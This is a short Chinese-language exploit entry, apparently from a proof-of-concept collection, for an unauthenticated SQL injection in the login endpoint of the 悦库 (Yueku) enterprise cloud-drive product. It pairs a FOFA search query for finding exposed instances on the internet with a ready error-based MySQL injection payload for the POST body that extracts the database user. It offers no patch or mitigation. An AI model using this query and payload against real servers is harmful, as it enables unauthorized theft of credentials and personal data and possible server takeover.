# 悦库企业网盘SQL注入漏洞

### 1.漏洞描述

悦库企业网盘 登录框接口/user/login/.html 处存在SQL注入漏洞,未经身份验证的远程攻击者除了可以利用 SQL 注入漏洞获取数据库中的信息（例如，管理员后台密码、站点的用户个人信息）之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。

### 2.fofa语法

```xml
app="悦库-悦库网盘"
```

### 3.漏洞复现

抓包后修改方法为POST，添加请求体

```xml
account=') AND GTID_SUBSET(CONCAT(0x7e,(SELECT (ELT(5597=5597,user()))),0x7e),5597)-- HZLK
```

![img](https://cdn.nlark.com/yuque/0/2024/png/42783549/1719398015088-c0e341f7-63ec-4d6a-a120-f53ad20cad18.png)